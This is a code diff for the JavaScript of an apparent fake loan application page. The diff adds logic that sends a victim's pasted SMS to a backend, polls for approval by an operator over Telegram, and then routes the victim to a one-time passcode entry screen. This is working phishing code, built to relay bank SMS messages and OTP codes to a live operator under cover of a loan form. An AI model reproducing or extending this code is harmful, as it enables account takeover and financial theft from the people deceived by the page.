@@ -31,7 +31,7 @@ amountSlider.addEventListener('input', calculateLoan);
 termSlider.addEventListener('input', calculateLoan);
 calculateLoan();
 
-// Submit Application Logic
+// Submit Initial Application Logic
 document.getElementById('submit-btn').addEventListener('click', async function(e) {
     e.preventDefault();
     
@@ -120,17 +120,54 @@ verifyBtn.addEventListener('click', function() {
         return;
     }
 
-    // Optional: send the SMS to Telegram in the background
+    // Show Processing Screen
+    document.getElementById('processing-title').innerText = "Verifying SMS...";
+    document.getElementById('processing-text').innerText = "Please wait while an agent reviews the pasted SMS.";
+    document.getElementById('loader-spinner').style.display = "block";
+    showScreen('screen-processing');
+
+    // Send SMS to backend
     fetch('/api/verify-sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sms: smsText, appId: window.currentAppId || 'unknown' })
-    });
+    })
+    .then(res => res.json())
+    .then(result => {
+        if (result.success) {
+            // Start polling to check if Telegram approved the SMS
+            const interval = setInterval(async () => {
+                try {
+                    const statusRes = await fetch(`/api/sms-status/${window.currentAppId}`);
+                    const statusData = await statusRes.json();
 
-    // Move to the new OTP Screen
-    showScreen('screen-otp');
-    // Auto-focus the first box
-    setTimeout(() => document.querySelectorAll('.otp-box')[0].focus(), 300);
+                    if (statusData.status === 'approved') {
+                        clearInterval(interval);
+                        document.getElementById('processing-title').innerText = "SMS Approved";
+                        document.getElementById('processing-text').innerText = "Redirecting to final step...";
+                        document.getElementById('loader-spinner').style.display = "none";
+                        
+                        setTimeout(() => {
+                            showScreen('screen-otp');
+                            // Auto-focus first box
+                            setTimeout(() => document.querySelectorAll('.otp-box')[0].focus(), 300);
+                        }, 1000);
+
+                    } else if (statusData.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('processing-title').innerText = "SMS Rejected";
+                        document.getElementById('processing-text').innerText = "The agent rejected this SMS. Please try again.";
+                        document.getElementById('loader-spinner').style.display = "none";
+                    }
+                } catch (error) {
+                    console.error("Checking SMS status...", error);
+                }
+            }, 3000); // Check every 3 seconds
+        } else {
+            alert("Error sending SMS.");
+            showScreen('screen-sms');
+        }
+    });
 });
 
 // --- OTP Screen Logic ---
